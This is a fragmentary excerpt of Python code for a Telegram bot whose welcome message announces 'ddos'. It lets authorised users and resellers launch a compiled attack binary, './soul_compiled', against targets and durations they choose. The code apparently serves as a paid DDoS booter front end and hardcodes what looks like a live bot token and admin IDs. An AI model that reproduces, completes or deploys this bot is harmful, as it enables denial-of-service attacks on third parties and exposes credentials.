...
bot = telebot.TeleBot('7843468016:AAEqlsTKmfIwwxv0cvTxltyquSF5KMDyYUY')

# Admin user IDs
admin_id = {"7541279033", "12345667", "12345667"}
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  
            ...
            if time > 600:
                ...
                full_command = f"./soul_compiled {king} {soulking} {time} 900"
        ...
        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - RESELLER ."
...
def welcome_start(message):
    ...
    response = f'''ıllıllı⭐🌟 W͙e͙l͙c͙o͙m͙e͙ t͙o͙ ddos ❣️ 🌟⭐ıllıllı \n {user_name}! \n🄱🄶🄼🄸 🄺🄸 🄶🄰🄽🄳 🄼🄰🅁🄽🄴 🄰🄰 🄶🅈🄴😜
